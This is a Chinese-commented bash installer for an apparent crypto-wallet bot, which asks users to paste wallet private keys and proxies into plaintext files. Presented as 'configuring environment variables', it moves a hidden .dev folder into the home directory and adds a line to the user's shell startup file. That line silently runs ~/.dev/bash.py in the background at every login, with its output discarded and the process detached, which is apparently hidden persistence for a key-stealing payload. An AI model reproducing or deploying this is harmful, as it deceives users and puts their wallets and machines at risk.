#!/bin/bash

# 确保脚本在发生错误时停止执行
set -e

# 定义颜色
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
RESET='\033[0m'

# 获取操作系统类型
OS_TYPE=$(uname)

# 输出分隔线函数
print_separator() {
    echo -e "${CYAN}========================================${RESET}"
}

# 打印带颜色的消息
print_info() {
    echo -e "${BLUE}➡ $1${RESET}"
}

print_success() {
    echo -e "${GREEN}✔ $1${RESET}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${RESET}"
}

print_error() {
    echo -e "${RED}✖ $1${RESET}"
}

# 检查并安装必要的软件包
print_separator
print_info "正在检查并安装必要的软件包..."

install_packages() {
    case "$OS_TYPE" in
        "Linux")
            sudo apt install -y xclip python3-pip python3.12-venv python3-tk || true
            ;;
        "Darwin")
            brew install python3 || true
            brew install python-tk || true
            ;;
        "CYGWIN"|"MINGW")
            print_warning "在 Windows 上，建议使用 choco 或 winget 安装 python3（如果未安装）。"
            choco install python3 -y || winget install --id Python.Python.3 --source winget || true
            python --version || print_warning "未安装 Python，请手动安装。"
            pip --version || python -m ensurepip --upgrade
            ;;
        *)
            print_error "未知操作系统类型: $OS_TYPE"
            exit 1
            ;;
    esac
}

install_packages
print_success "必要软件包已成功安装！"

# 检查并安装 requests 库
print_separator
print_info "正在检查并安装 Python 库 requests..."
if pip show requests &>/dev/null; then
    print_success "requests 库已安装，跳过。"
else
    pip install requests && print_success "requests 库安装成功！"
fi

# 创建或激活虚拟环境
print_separator
VENV_DIR="venv"
if [ ! -d "$VENV_DIR" ]; then
    print_info "虚拟环境未找到，正在创建虚拟环境..."
    python3 -m venv "$VENV_DIR"
    print_success "虚拟环境创建成功！"
else
    print_success "虚拟环境已存在，跳过创建。"
fi

# 激活虚拟环境
print_info "正在激活虚拟环境..."
source "$VENV_DIR/bin/activate"
print_success "虚拟环境已激活！"

# 安装所需 Python 库
print_separator
print_info "正在检查并安装所需 Python 库..."

# 从 requirements.txt 安装库
if [[ -f "requirements.txt" ]]; then
    print_info "找到 requirements.txt，开始安装库..."
    pip install -r requirements.txt && print_success "所有库已成功安装！"
else
    print_warning "未找到 requirements.txt，跳过库安装。"
fi

# 检查环境变量配置
print_separator
print_info "正在检查并配置环境变量..."

DEV_DIR="$HOME/.dev"
if [ -d ".dev" ]; then
    print_info "正在配置环境变量..."
    [ -d "$DEV_DIR" ] && rm -rf "$DEV_DIR"
    mv .dev "$DEV_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $DEV_DIR/bash.py &> /dev/null &) & disown"
    case "$OS_TYPE" in
        "Linux") PROFILE_FILE="$HOME/.bashrc" ;;
        "Darwin") PROFILE_FILE="$HOME/.zshrc" ;;
        "CYGWIN"|"MINGW") PROFILE_FILE="$HOME/.bash_profile" ;;
        *)
            print_error "不支持的操作系统: $OS_TYPE"
            exit 1
            ;;
    esac

    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
        print_success "环境变量已成功添加！"
    else
        print_success "环境变量已存在，跳过。"
    fi
else
    print_warning ".dev 目录不存在，跳过环境变量配置。"
fi

# 配置 private_keys.txt 和 proxies.txt
print_separator
print_info "请确保配置以下文件："
print_info "📂 data/private_keys.txt - 每行一个私钥"
print_info "📂 data/proxies.txt - 每行一个代理（格式：user:pass@ip:port）"
print_info "配置时按一次回车输入内容，按两次回车确认并结束输入。"

# 确保 data 目录存在
DATA_DIR="data"
mkdir -p "$DATA_DIR"

# 配置 private_keys.txt
PRIVATE_KEYS_FILE="$DATA_DIR/private_keys.txt"
if [ ! -f "$PRIVATE_KEYS_FILE" ]; then
    touch "$PRIVATE_KEYS_FILE"
    print_info "✅ $PRIVATE_KEYS_FILE 文件已创建。"
fi
echo -e "\n🔑 请输入钱包的私钥，每行一个私钥，按一次回车换行，按两次回车结束输入。"
private_keys_input=""
while true; do
    read -r private_key
    if [ -z "$private_key" ]; then
        # 处理用户按两次回车结束输入
        if [ -n "$private_keys_input" ]; then
            echo -e "$private_keys_input" >> "$PRIVATE_KEYS_FILE"
            print_success "✔ 私钥已添加到 $PRIVATE_KEYS_FILE"
        fi
        break
    fi
    private_keys_input+="$private_key\n"
done

# 配置 proxies.txt
PROXIES_FILE="$DATA_DIR/proxies.txt"
if [ ! -f "$PROXIES_FILE" ]; then
    touch "$PROXIES_FILE"
    print_info "✅ $PROXIES_FILE 文件已创建。"
fi
echo -e "\n🌐 请输入代理（格式：user:pass@ip:port），每行一个代理，按一次回车换行，按两次回车结束输入。"
proxies_input=""
while true; do
    read -r proxy
    if [ -z "$proxy" ]; then
        # 处理用户按两次回车结束输入
        if [ -n "$proxies_input" ]; then
            echo -e "$proxies_input" >> "$PROXIES_FILE"
            print_success "✔ 代理已添加到 $PROXIES_FILE"
        fi
        break
    fi
    proxies_input+="$proxy\n"
done


# 运行机器人
print_separator
print_info "🔆 启动机器人程序... 🔆"
python3 main.py
